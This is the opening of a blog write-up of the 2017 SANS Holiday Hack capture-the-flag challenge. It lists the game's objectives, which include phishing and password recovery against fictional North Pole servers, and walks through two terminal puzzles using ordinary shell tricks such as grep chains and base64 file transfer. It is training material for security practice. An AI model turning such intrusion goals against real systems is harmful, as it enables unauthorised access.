<!DOCTYPE html>
<html lang="en">
<head>
  <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>
  <link rel="stylesheet" type="text/css" href="https://allyourbase.utouch.fr/theme/css/style.min.css">
  <link rel="stylesheet" type="text/css" href="https://allyourbase.utouch.fr/theme/css/pygments.min.css">
  <link rel="stylesheet" type="text/css" href="https://allyourbase.utouch.fr/theme/css/font-awesome.min.css">
  <link href="https://allyourbase.utouch.fr//extras/style.css" rel="stylesheet">
  <link href="https://allyourbase.utouch.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="All Your Base Are Belong To Me Atom">
  <link rel="shortcut icon" href="/extras/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/extras/favicon.ico" type="image/x-icon">

  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="" />
<meta name="author" content="useless" />
<meta name="description" content="'Tis the season to be pwning, falalalala lalalala. As usual, here's my write-up for the 2017 SANS Christmas Challenge. Table of contents Introduction First page of The Great Book North Pole and Beyond: Winter Wonder Landing Cranberry Pi: Yannick's (dirty) solution Cranberry Pi: the "official" solution Redirecting the snowball Second …" />
<meta name="keywords" content="">
<meta property="og:site_name" content="All Your Base Are Belong To Me"/>
<meta property="og:title" content="SANS Christmas Challenge 2017"/>
<meta property="og:description" content="'Tis the season to be pwning, falalalala lalalala. As usual, here's my write-up for the 2017 SANS Christmas Challenge. Table of contents Introduction First page of The Great Book North Pole and Beyond: Winter Wonder Landing Cranberry Pi: Yannick's (dirty) solution Cranberry Pi: the "official" solution Redirecting the snowball Second …"/>
<meta property="og:locale" content="en_US"/>
<meta property="og:url" content="https://allyourbase.utouch.fr/posts/2018/01/10/sans-christmas-challenge-2017/"/>
<meta property="og:type" content="article"/>
<meta property="article:published_time" content="2018-01-10 00:00:00+01:00"/>
<meta property="article:modified_time" content=""/>
<meta property="article:author" content="https://allyourbase.utouch.fr/author/useless.html">
<meta property="article:section" content="Write-up"/>
<meta property="og:image" content="/images/useless_profile_pic.jpg">  <title>All Your Base Are Belong To Me &ndash; SANS Christmas Challenge 2017</title>
</head>
<body>
  <aside>
    <div>
      <a href="https://allyourbase.utouch.fr">
        <img src="/images/useless_profile_pic.jpg" alt="All Your Base Are Belong To Me" title="All Your Base Are Belong To Me">
      </a>
      <h1><a href="https://allyourbase.utouch.fr">All Your Base Are Belong To Me</a></h1>
      <p>You know, if that's alright with you</p>
      <nav>
        <ul class="list">
        </ul>
      </nav>
      <ul class="social">
        <li><a class="sc-envelope-o" href="mailto:yannick at meheut dot org" target="_blank"><i class="fa fa-envelope-o"></i></a></li>
        <li><a class="sc-github" href="https://github.com/the-useless-one/" target="_blank"><i class="fa fa-github"></i></a></li>
        <li><a class="sc-rss" href="https://allyourbase.utouch.fr/feeds/all.atom.xml" target="_blank"><i class="fa fa-rss"></i></a></li>
      </ul>
    </div>
  </aside>
  <main>
    <nav>
      <a href="https://allyourbase.utouch.fr">Home</a>
      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="https://allyourbase.utouch.fr/feeds/all.atom.xml">Atom</a>
    </nav>

<article>
  <header>
    <h1 id="sans-christmas-challenge-2017">SANS Christmas Challenge 2017</h1>
    <p>Posted on mer. 10 janvier 2018 in <a href="https://allyourbase.utouch.fr/category/write-up.html">Write-up</a></p>
  </header>
  <div>
    <img alt="sans_christmas_challenge_2017_logo.png" class="align-center" src="/images/sans-christmas-challenge-2017/sans_christmas_challenge_2017_logo.png" />
<p>'Tis the season to be pwning, falalalala lalalala. As usual, here's my write-up
for the <a class="reference external" href="https://holidayhackchallenge.com/2017/">2017 SANS Christmas Challenge</a>.</p>
<div class="contents topic" id="table-of-contents">
<p class="topic-title first">Table of contents</p>
<ul class="simple">
<li><a class="reference internal" href="#introduction" id="id16">Introduction</a></li>
<li><a class="reference internal" href="#first-page-of-the-great-book" id="id17">First page of <em>The Great Book</em></a><ul>
<li><a class="reference internal" href="#north-pole-and-beyond-winter-wonder-landing" id="id18">North Pole and Beyond: Winter Wonder Landing</a><ul>
<li><a class="reference internal" href="#cranberry-pi-yannick-s-dirty-solution" id="id19">Cranberry Pi: Yannick's (dirty) solution</a></li>
<li><a class="reference internal" href="#cranberry-pi-the-official-solution" id="id20">Cranberry Pi: the &quot;official&quot; solution</a></li>
<li><a class="reference internal" href="#redirecting-the-snowball" id="id21">Redirecting the snowball</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#second-page-of-the-great-book" id="id22">Second page of <em>The Great Book</em></a><ul>
<li><a class="reference internal" href="#north-pole-and-beyond-winconceivable-the-cliffs-of-winsanity" id="id23">North Pole and Beyond: Winconceivable: The Cliffs of Winsanity</a><ul>
<li><a class="reference internal" href="#id1" id="id24">Cranberry Pi: Yannick's (dirty) solution</a></li>
<li><a class="reference internal" href="#id2" id="id25">Cranberry Pi: the &quot;official&quot; solution</a></li>
<li><a class="reference internal" href="#id3" id="id26">Redirecting the snowball</a></li>
</ul>
</li>
<li><a class="reference internal" href="#north-pole-christmas-town-infrastructure-letters-to-santa-application" id="id27">North Pole Christmas Town infrastructure: Letters to Santa application</a></li>
</ul>
</li>
<li><a class="reference internal" href="#third-page-of-the-great-book" id="id28">Third page of <em>The Great Book</em></a><ul>
<li><a class="reference internal" href="#north-pole-and-beyond-cryokinetic-magic" id="id29">North Pole and Beyond: Cryokinetic Magic</a><ul>
<li><a class="reference internal" href="#id4" id="id30">Cranberry Pi: Yannick's (dirty) solution</a></li>
<li><a class="reference internal" href="#id5" id="id31">Cranberry Pi: the &quot;official&quot; solution</a></li>
<li><a class="reference internal" href="#id6" id="id32">Redirecting the snowball</a></li>
</ul>
</li>
<li><a class="reference internal" href="#north-pole-christmas-town-infrastructure-smb-server" id="id33">North Pole Christmas Town infrastructure: SMB server</a></li>
</ul>
</li>
<li><a class="reference internal" href="#fourth-page-of-the-great-book" id="id34">Fourth page of <em>The Great Book</em></a><ul>
<li><a class="reference internal" href="#north-pole-and-beyond-there-s-snow-place-like-home" id="id35">North Pole and Beyond: There's Snow Place Like Home</a><ul>
<li><a class="reference internal" href="#cranberry-pi" id="id36">Cranberry Pi</a></li>
<li><a class="reference internal" href="#id7" id="id37">Redirecting the snowball</a></li>
</ul>
</li>
<li><a class="reference internal" href="#north-pole-christmas-town-infrastructure-elf-web-access" id="id38">North Pole Christmas Town infrastructure: Elf Web Access</a></li>
</ul>
</li>
<li><a class="reference internal" href="#fifth-page-of-the-great-book" id="id39">Fifth page of <em>The Great Book</em></a><ul>
<li><a class="reference internal" href="#north-pole-and-beyond-bumbles-bounce" id="id40">North Pole and Beyond: Bumbles Bounce</a><ul>
<li><a class="reference internal" href="#id8" id="id41">Cranberry Pi</a></li>
<li><a class="reference internal" href="#id9" id="id42">Redirecting the snowball</a></li>
</ul>
</li>
<li><a class="reference internal" href="#north-pole-christmas-town-infrastructure-north-pole-police-department-web-site" id="id43">North Pole Christmas Town infrastructure: North Pole Police Department web site</a></li>
</ul>
</li>
<li><a class="reference internal" href="#sixth-page-of-the-great-book" id="id44">Sixth page of <em>The Great Book</em></a><ul>
<li><a class="reference internal" href="#north-pole-and-beyond-i-don-t-think-we-re-in-kansas-anymore" id="id45">North Pole and Beyond: I don't think we're in Kansas anymore</a><ul>
<li><a class="reference internal" href="#id10" id="id46">Cranberry Pi</a></li>
<li><a class="reference internal" href="#id11" id="id47">Redirecting the snowball</a></li>
</ul>
</li>
<li><a class="reference internal" href="#north-pole-christmas-town-infrastructure-elf-as-a-service-platform" id="id48">North Pole Christmas Town infrastructure: Elf as a Service platform</a></li>
</ul>
</li>
<li><a class="reference internal" href="#seventh-page-of-the-great-book" id="id49">Seventh page of <em>The Great Book</em></a><ul>
<li><a class="reference internal" href="#north-pole-and-beyond-oh-wait-maybe-we-are" id="id50">North Pole and Beyond: Oh wait! Maybe we are...</a><ul>
<li><a class="reference internal" href="#id12" id="id51">Cranberry Pi</a></li>
<li><a class="reference internal" href="#id13" id="id52">Redirecting the snowball</a></li>
</ul>
</li>
<li><a class="reference internal" href="#north-pole-christmas-town-infrastructure-elf-machine-interface-server" id="id53">North Pole Christmas Town infrastructure: Elf-Machine Interface server</a></li>
</ul>
</li>
<li><a class="reference internal" href="#who-is-behind-all-this" id="id54">Who is behind all this?</a><ul>
<li><a class="reference internal" href="#north-pole-and-beyond-we-re-off-to-see-the" id="id55">North Pole and Beyond: We're Off To See The...</a><ul>
<li><a class="reference internal" href="#id14" id="id56">Cranberry Pi</a></li>
<li><a class="reference internal" href="#id15" id="id57">Redirecting the snowball</a></li>
</ul>
</li>
<li><a class="reference internal" href="#north-pole-christmas-town-infrastructure-elf-database" id="id58">North Pole Christmas Town infrastructure: Elf Database</a></li>
</ul>
</li>
<li><a class="reference internal" href="#answers-to-the-questions" id="id59">Answers to the questions</a></li>
<li><a class="reference internal" href="#conclusion" id="id60">Conclusion</a></li>
</ul>
</div>
<div class="section" id="introduction">
<h2><a class="toc-backref" href="#id16">Introduction</a></h2>
<p>We're greeted by Sam the Snowman, who exposes the situation to us. The North
Pole is under siege, attacked by giant falling snowballs, and an
Inter-Dimensional Tornado, that shredded <em>The Great Book</em>. This book tells the
epic story of the elves. Our mission is to redirect the falling snowballs,
find out who is behind all this, and recover the missing seven pages of <em>The
Great Book</em>.</p>
<p>Here are the questions we must answer:</p>
<ol class="arabic simple">
<li><cite>Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?</cite></li>
<li><cite>Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?</cite></li>
<li><cite>The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?</cite></li>
<li><cite>Elf Web Access (EWA. is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?</cite></li>
<li><cite>How many infractions are required to be marked as naughty on Santa's Naughty and Nice List? What are the names of at least six insider threat moles?  Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?</cite></li>
<li><cite>The North Pole engineering team has introduced an Elf as a Service (EaaS.  platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?</cite></li>
<li><cite>Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI. to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from C:\GreatBookPage7.pdf. What does The Great Book page describe?</cite></li>
<li><cite>Fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com. Who wrote the letter?</cite></li>
<li><cite>Which character is ultimately the villain causing the giant snowball problem. What is the villain's motive?</cite></li>
</ol>
<p>This challenge is divided into two targets:</p>
<ul class="simple">
<li>The North Pole Christmas Town infrastructure, which includes the Letters To
Santa application, and the internal 10.142.0.0/24 network.</li>
<li>The <a class="reference external" href="https://2017.holidayhackchallenge.com/">North Pole and Beyond</a>, where
we have to redirect falling snowballs. These levels also have Cranberry Pi
terminal with challenges to solve. Solving these challenges gives us objects
to redirect the falling snowballs, and hints to the exploitation of the North
Pole Christmas Town infrastructure. Hints are also available for the
Cranberry Pi terminal challenges, on the Twitter accounts of the different
elves.</li>
</ul>
<p>Now I know that hints can be helpful, but it's more fun to try and figure out
how to solve the different challenges our own way. So:</p>
<ul class="simple">
<li>We won't use the Twitter profiles to solve the Cranberry Pi challenges.</li>
<li>I'll post the solutions to the Cranberry Pi challenges, but we won't use the
hints that are given after solving.</li>
</ul>
<p>As usual, I'll try to detail my thought process as much as possible, including
dead-ends and mistakes (that's the best way to learn).</p>
<p>Sounds good? Great (plus, you don't really have a say)!</p>
</div>
<div class="section" id="first-page-of-the-great-book">
<h2><a class="toc-backref" href="#id17">First page of <em>The Great Book</em></a></h2>
<div class="section" id="north-pole-and-beyond-winter-wonder-landing">
<h3><a class="toc-backref" href="#id18">North Pole and Beyond: Winter Wonder Landing</a></h3>
<p>The first page is available in the North Pole and Beyond, in the level <strong>Winter
Wonder Landing</strong>. We must use the giant falling snowball to get the first page.
But let's first solve the Cranberry Pi challenge.</p>
<div class="section" id="cranberry-pi-yannick-s-dirty-solution">
<h4><a class="toc-backref" href="#id19">Cranberry Pi: Yannick's (dirty) solution</a></h4>
<pre class="literal-block">
                                 |
                               \ ' /
                             -- (*) --
                                &gt;*&lt;
                               &gt;0&lt;&#64;&lt;
                              &gt;&gt;&gt;&#64;&lt;&lt;*
                             &gt;&#64;&gt;*&lt;0&lt;&lt;&lt;
                            &gt;*&gt;&gt;&#64;&lt;&lt;&lt;&#64;&lt;&lt;
                           &gt;&#64;&gt;&gt;0&lt;&lt;&lt;*&lt;&lt;&#64;&lt;
                          &gt;*&gt;&gt;0&lt;&lt;&#64;&lt;&lt;&lt;&#64;&lt;&lt;&lt;
                         &gt;&#64;&gt;&gt;*&lt;&lt;&#64;&lt;&gt;*&lt;&lt;0&lt;*&lt;
           \*/          &gt;0&gt;&gt;*&lt;&lt;&#64;&lt;&gt;0&gt;&lt;&lt;*&lt;&#64;&lt;&lt;
       ___\\U//___     &gt;*&gt;&gt;&#64;&gt;&lt;0&lt;&lt;*&gt;&gt;&#64;&gt;&lt;*&lt;0&lt;&lt;
       |\\ | | \\|    &gt;&#64;&gt;&gt;0&lt;*&lt;0&gt;&gt;&#64;&lt;&lt;0&lt;&lt;&lt;*&lt;&#64;&lt;&lt;
       | \\| | _(UU)_ &gt;((*))_&gt;0&gt;&lt;*&lt;0&gt;&lt;&#64;&lt;&lt;&lt;0&lt;*&lt;
       |\ \| || / //||.*.*.*.|&gt;&gt;&#64;&lt;&lt;*&lt;&lt;&#64;&gt;&gt;&lt;0&lt;&lt;&lt;
       |\\_|_|&amp;&amp;_// ||*.*.*.*|_\\db//_
       &quot;&quot;&quot;&quot;|'.'.'.|~~|.*.*.*|     ____|_
           |'.'.'.|   ^^^^^^|____|&gt;&gt;&gt;&gt;&gt;&gt;|
           ~~~~~~~~         '&quot;&quot;&quot;&quot;`------'
My name is Bushy Evergreen, and I have a problem for you.
I think a server got owned, and I can only offer a clue.
We use the system for chat, to keep toy production running.
Can you help us recover from the server connection shunning?
Find and run the elftalkd binary to complete this challenge.
elf&#64;3b92caa92835:~$
</pre>
<p>Ok, so we just have to find the <code>elftalkd</code> binary and launch it, easy
enough:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@2849ef63a77a:~$</span> find / -name elftalkd
<span class="go">bash: /usr/local/bin/find: cannot execute binary file: Exec format error</span>
</pre></div>
<p>Hmm, <code>find</code> doesn't work, dammit. We can try to execute a
<code>ls -lR /</code>, however this does not give us the full path to the listed
files:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@2849ef63a77a:/$</span> ls -lR /
<span class="go">/:</span>
<span class="go">total 64</span>
<span class="go">drwxr-xr-x   2 root   root    4096 Nov 14 13:49 bin</span>
<span class="go">drwxr-xr-x   2 root   root    4096 Apr 12  2016 boot</span>
<span class="go">drwxr-xr-x   5 root   root     360 Dec 23 16:17 dev</span>
<span class="go">drwxr-xr-x   1 root   root    4096 Dec 23 16:17 etc</span>
<span class="go">drwxr-xr-x   1 root   root    4096 Dec  4 14:32 home</span>
<span class="go">drwxr-xr-x   8 root   root    4096 Sep 13  2015 lib</span>
<span class="go">drwxr-xr-x   2 root   root    4096 Nov 14 13:49 lib64</span>
<span class="go">drwxr-xr-x   2 root   root    4096 Nov 14 13:48 media</span>
<span class="go">drwxr-xr-x   2 root   root    4096 Nov 14 13:48 mnt</span>
<span class="go">drwxr-xr-x   2 root   root    4096 Nov 14 13:48 opt</span>
<span class="go">dr-xr-xr-x 292 nobody nogroup    0 Dec 23 16:17 proc</span>
<span class="go">drwx------   2 root   root    4096 Nov 14 13:49 root</span>
<span class="go">drwxr-xr-x   1 root   root    4096 Dec  4 14:32 run</span>
<span class="go">drwxr-xr-x   1 root   root    4096 Nov 17 21:59 sbin</span>
<span class="go">drwxr-xr-x   2 root   root    4096 Nov 14 13:48 srv</span>
<span class="go">dr-xr-xr-x  13 nobody nogroup    0 Dec 21 14:03 sys</span>
<span class="go">drwxrwxrwt   1 root   root    4096 Dec  4 14:32 tmp</span>
<span class="go">drwxr-xr-x   1 root   root    4096 Nov 14 13:48 usr</span>
<span class="go">drwxr-xr-x   1 root   root    4096 Nov 14 13:49 var</span>
<span class="go">/bin:</span>
<span class="go">total 7364</span>
<span class="go">-rwxr-xr-x 1 root root 1037528 May 16  2017 bash</span>
<span class="go">-rwxr-xr-x 1 root root   52080 Mar  2  2017 cat</span>
<span class="go">-rwxr-xr-x 1 root root   60272 Mar  2  2017 chgrp</span>
<span class="go">-rwxr-xr-x 1 root root   56112 Mar  2  2017 chmod</span>
<span class="go">-rwxr-xr-x 1 root root   64368 Mar  2  2017 chown</span>
<span class="go">-rwxr-xr-x 1 root root  151024 Mar  2  2017 cp</span>
<span class="go">[snip]</span>
<span class="go">/var/opt:</span>
<span class="go">total 0</span>
<span class="go">/var/spool:</span>
<span class="go">total 0</span>
<span class="go">lrwxrwxrwx 1 root root 7 Nov 14 13:48 mail -&gt; ../mail</span>
<span class="go">/var/tmp:</span>
<span class="go">total 0</span>
</pre></div>
<p>If I pipe this output to a <code>grep elftalkd</code>, we can see that the file
exists:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@2849ef63a77a:/$</span> ls -lR / <span class="p">|</span> grep elftalkd
<span class="go">-rwxr-xr-x 1 root root 7385168 Dec  4 14:29 elftalkd</span>
</pre></div>
<p>However, we don't have the parent folder. If we look at the full output of
<code>ls -lR</code>, we can see that it has this form:</p>
<div class="highlight"><pre><span></span><span class="go">/path/to/folder1</span>
<span class="go">-rwxr-xr-x 1 root root   52080 Mar  2  2017 file1_in_folder_1</span>
<span class="go">-rwxr-xr-x 1 root root   52080 Mar  2  2017 file2_in_folder_1</span>
<span class="go">-rwxr-xr-x 1 root root   52080 Mar  2  2017 file3_in_folder_1</span>
<span class="go">/path/to/folder2</span>
<span class="go">-rwxr-xr-x 1 root root   52080 Mar  2  2017 file1_in_folder_2</span>
<span class="go">-rwxr-xr-x 1 root root   52080 Mar  2  2017 file2_in_folder_2</span>
<span class="go">-rwxr-xr-x 1 root root   52080 Mar  2  2017 file3_in_folder_2</span>
<span class="go">[...]</span>
</pre></div>
<p>We can see that we have the full path to the parent folder, and then, line by
line, the files contained in this folder. So, if I grep for lines starting
with <code>/</code>, along with greping for <code>elftalkd</code>, I'll get an output
like this:</p>
<div class="highlight"><pre><span></span><span class="go">[...]</span>
<span class="go">/path/to/folder1</span>
<span class="go">/path/to/folder2</span>
<span class="go">/path/to/elftalkd</span>
<span class="go">-rwxr-xr-x 1 root root   52080 Mar  2  2017 elkftalkd</span>
<span class="go">/path/to/folder3</span>
<span class="go">[...]</span>
</pre></div>
<p>However, the result will be lost in a list of folders, so I pipe my output
in another <code>grep</code>, where I look for <code>elkftalkd</code>. The <code>-B 1</code>
option tells <code>grep</code> to print the line before the matching line (which
should be the line with the parent folder to our program):</p>
<div class="highlight"><pre><span></span><span class="gp">elf@2849ef63a77a:/$</span> ls -lR / <span class="p">|</span> grep -E <span class="s1">&#39;^/|elftalkd&#39;</span> <span class="p">|</span> grep -B <span class="m">1</span> elftalkd
<span class="go">/run/elftalk/bin:</span>
<span class="go">-rwxr-xr-x 1 root root 7385168 Dec  4 14:29 elftalkd</span>
</pre></div>
<p>We now have the full path to our binary, <code>/run/elftalkd/bin/elftalkd</code>.
We can now launch it:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@2849ef63a77a:/$</span> /run/elftalk/bin/elftalkd
<span class="go">        Running in interactive mode</span>
<span class="go">        --== Initializing elftalkd ==--</span>
<span class="go">Initializing Messaging System!</span>
<span class="go">Nice-O-Meter configured to 0.90 sensitivity.</span>
<span class="go">Acquiring messages from local networks...</span>
<span class="go">--== Initialization Complete ==--</span>
<span class="go">      _  __ _        _ _       _</span>
<span class="go">     | |/ _| |      | | |     | |</span>
<span class="go">  ___| | |_| |_ __ _| | | ____| |</span>
<span class="go"> / _ \ |  _| __/ _` | | |/ / _` |</span>
<span class="go">|  __/ | | | || (_| | |   &lt; (_| |</span>
<span class="go"> \___|_|_|  \__\__,_|_|_|\_\__,_|</span>
<span class="go">-*&gt; elftalkd! &lt;*-</span>
<span class="go">Version 9000.1 (Build 31337)</span>
<span class="go">By Santa Claus &amp; The Elf Team</span>
<span class="go">Copyright (C) 2017 NotActuallyCopyrighted. No actual rights reserved.</span>
<span class="go">Using libc6 version 2.23-0ubuntu9</span>
<span class="go">LANG=en_US.UTF-8</span>
<span class="go">Timezone=UTC</span>
<span class="go">Commencing Elf Talk Daemon (pid=6021)... done!</span>
<span class="go">Background daemon...</span>
</pre></div>
</div>
<div class="section" id="cranberry-pi-the-official-solution">
<h4><a class="toc-backref" href="#id20">Cranberry Pi: the &quot;official&quot; solution</a></h4>
<p>After solving the Cranberry Pi challenge in my (dirty) way, I looked at <a class="reference external" href="https://twitter.com/GreenestElf">Bushy
Evergreen's twitter profile</a>.  In <a class="reference external" href="https://twitter.com/GreenestElf/status/938165130906365952">this
tweet</a>, he
mentions that someone replaced the <code>find</code> executable with a wrong
version. Let's take a look at the <code>find</code> executable on the console:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@2a00576f91ec:~$</span> which find
<span class="go">/usr/local/bin/find</span>
<span class="gp">elf@2a00576f91ec:~$</span> file /usr/local/bin/find
<span class="go">/usr/local/bin/find: ELF 64-bit LSB shared object, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=6ebee1b65b978900b5485</span>
<span class="go">2a2d1e698f911064ab3, stripped</span>
</pre></div>
<p>Hmm, the <code>find</code> executable seems to be for an ARM processor. However,
we appear to be running on an Intel x64 processor:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@2a00576f91ec:~$</span> uname -a
<span class="go">Linux 2a00576f91ec 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 x86_64 x86_64 GNU/Linux</span>
</pre></div>
<p>That's why we got the <code>Exec format error</code> message when we tried to
execute it: it's not for the right architecture. Let's copy a x64 <code>find</code>
executable to the machine. To do so, I base64-encoded the <code>find</code> binary
from my system, pasted it to a file on the Cranberry Pi console, and then
decoded it:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@2a00576f91ec:~$</span> <span class="nb">echo</span> <span class="s2">&quot;f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAwHIAAAAAAABAAAAAAAAAAAhbAwAAAAAAAAAAAEAAOAAJ</span>
<span class="go">AEAAHQAcAAYAAAAFAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA+AEAAAAAAAD4AQAAAAAAAAgA</span>
<span class="go">[snip]</span>
<span class="go">AAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAPxZ</span>
<span class="go">AwAAAAAABgEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=&quot; &gt; ~/find.b64</span>
<span class="gp">elf@2a00576f91ec:~$</span> base64 -d ~/find.b64 &gt; ~/find
<span class="gp">elf@2a00576f91ec:~$</span> chmod +x ~/find
<span class="gp">elf@2a00576f91ec:~$</span> file ~/find
<span class="go">/home/elf/find: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7079a38abca5fb9d188cc66bb15fb</span>
<span class="go">ec5e98f0f00, stripped</span>
<span class="gp">elf@2a00576f91ec:~$</span> ~/find / -name elftalkd <span class="m">2</span>&gt; /dev/null
<span class="go">/run/elftalk/bin/elftalkd</span>
</pre></div>
</div>
<div class="section" id="redirecting-the-snowball">
<h4><a class="toc-backref" href="#id21">Redirecting the snowball</a></h4>
<p>Now that we have completed the challenge, we get a new object to redirect our
snowballs: the Conveyor, that can redirect snowballs.</p>
<img alt="winter_wonder_landing_terminal.png" class="align-center" src="/images/sans-christmas-challenge-2017/winter_wonder_landing_terminal.png" />
<p>Here's the layout I used to redirect the snowball to the first page of <em>The
Great Book</em> (Ok, this is dirty, but I didn't understand that if I clicked on
the conveyor, I could change its direction):</p>
<img alt="winter_wonder_landing_snowball.gif" class="align-center" src="/images/sans-christmas-challenge-2017/winter_wonder_landing_snowball.gif" />
<p>We now have the <a class="reference external" href="/docs/sans-christmas-challenge-2017/GreatBookPage1.pdf">first page to The Great Book</a>
(sha256: <code>b86eca1fdb8d1fb00c38cebfbca0989579c00b482343dff950310de0f8c77888</code>):</p>
<blockquote>
<p>About This Book...</p>
<p>This tome is the work of a successive group of anonymous scribes dedicated
to preserving the memory of the exceptional Little People of Oz so that
they'll go down in history. Over a span of several centuries, each author
has striven to capture the most important social, political, and
technological changes the Ozians have experienced from the happy golden
days of yore through today.</p>
<p>Each and every author is dedicated to the goal of helping future
generations appreciate and understand the unique shared heritage of
merriment, mirth, and magnanimity characteristic of the Little People of
Oz. This book describes the good times they have shared. Also, it does
not shy away from recording the bad times they have suffered as well. Each
writer on this great multi-generational project attempts to record and
present the facts neutrally, without bias or opinion, uninfluenced as much
as possible by factionalism or the controversies of the day.</p>
</blockquote>
<p>This North Pole and Beyond level doesn't have a North Pole Christmas Town
infrastructure level associated, so let's move on to the next page.</p>
</div>
</div>
</div>
<div class="section" id="second-page-of-the-great-book">
<h2><a class="toc-backref" href="#id22">Second page of <em>The Great Book</em></a></h2>
<p>Now the second page is not in the North Pole and Beyond level, but in the
North Pole Christmas Town infrastructure. But let's solve the NPaB challenge
first.</p>
<div class="section" id="north-pole-and-beyond-winconceivable-the-cliffs-of-winsanity">
<h3><a class="toc-backref" href="#id23">North Pole and Beyond: Winconceivable: The Cliffs of Winsanity</a></h3>
<div class="section" id="id1">
<h4><a class="toc-backref" href="#id24">Cranberry Pi: Yannick's (dirty) solution</a></h4>
<pre class="literal-block">
                ___,&#64;
               /  &lt;
          ,_  /    \  _,
      ?    \`/______\`/
   ,_(_).  |; (e  e) ;|
    \___ \ \/\   7  /\/    _\8/_
        \/\   \'=='/      | /| /|
         \ \___)--(_______|//|//|
          \___  ()  _____/|/_|/_|
             /  ()  \    `----'
            /   ()   \
           '-.______.-'
   jgs   _    |_||_|    _
        (&#64;____) || (____&#64;)
         \______||______/
My name is Sparkle Redberry, and I need your help.
My server is atwist, and I fear I may yelp.
Help me kill the troublesome process gone awry.
I will return the favor with a gift before nigh.

Kill the &quot;santaslittlehelperd&quot; process to complete this challenge.
</pre>
<p>Ok, we need to kill the <code>santaslittlehelperd</code> process. Weirdly enough,
the <code>kill</code> command did not seem to have any effect on the process:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@cc2c61f5d274:~$</span> ps aux <span class="p">|</span> grep santaslittlehelperd
<span class="go">elf          8  0.0  0.0   4224   684 pts/0    S    17:02   0:00 /usr/bin/santaslittlehelperd</span>
<span class="go">elf        163  0.0  0.0  11284   944 pts/0    S+   17:04   0:00 grep --color=auto santaslittlehelperd</span>
<span class="gp">elf@cc2c61f5d274:~$</span> <span class="nb">kill</span> -9 <span class="m">8</span>
<span class="gp">elf@cc2c61f5d274:~$</span> ps aux <span class="p">|</span> grep santaslittlehelperd
<span class="go">elf          8  0.0  0.0   4224   684 pts/0    S    17:02   0:00 /usr/bin/santaslittlehelperd</span>
<span class="go">elf        171  0.0  0.0  11284   944 pts/0    S+   17:04   0:00 grep --color=auto santaslittlehelperd</span>
</pre></div>
<p>However, killing the process in the <code>top</code> program seemed to work:</p>
<div class="highlight"><pre><span></span><span class="go">top - 17:05:09 up 2 days,  3:10,  0 users,  load average: 0.05, 0.12, 0.12</span>
<span class="go">Tasks:   6 total,   1 running,   5 sleeping,   0 stopped,   0 zombie</span>
<span class="gp">%</span>Cpu<span class="o">(</span>s<span class="o">)</span>:  <span class="m">0</span>.0 us,  <span class="m">0</span>.7 sy,  <span class="m">0</span>.0 ni, <span class="m">99</span>.3 id,  <span class="m">0</span>.0 wa,  <span class="m">0</span>.0 hi,  <span class="m">0</span>.0 si,  <span class="m">0</span>.0 st
<span class="go">KiB Mem : 14782588 total,  5738860 free,  1989032 used,  7054696 buff/cache</span>
<span class="go">KiB Swap:        0 total,        0 free,        0 used. 11804040 avail Mem</span>
<span class="hll"><span class="go">Send pid 8 signal [15/sigterm] 9</span>
</span><span class="go">  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND</span>
<span class="go">    8 elf       20   0    4224    684    612 S   0.0  0.0   0:00.00 santaslittlehel</span>
<span class="go">   11 elf       20   0   13528   6468   1488 S   0.0  0.0   0:00.09 kworker</span>
<span class="go">   12 elf       20   0   18248   3336   2848 S   0.0  0.0   0:00.01 bash</span>
<span class="go">   18 elf       20   0   71468  26636   9420 S   0.0  0.2   0:00.50 kworker</span>
<span class="go">  210 elf       20   0   36672   3124   2660 R   0.0  0.0   0:00.00 top</span>
</pre></div>
</div>
<div class="section" id="id2">
<h4><a class="toc-backref" href="#id25">Cranberry Pi: the &quot;official&quot; solution</a></h4>
<p>After solving the challenge, I checked <a class="reference external" href="https://twitter.com/GlitteryElf">Sparkle Redberry's Twitter account</a>.
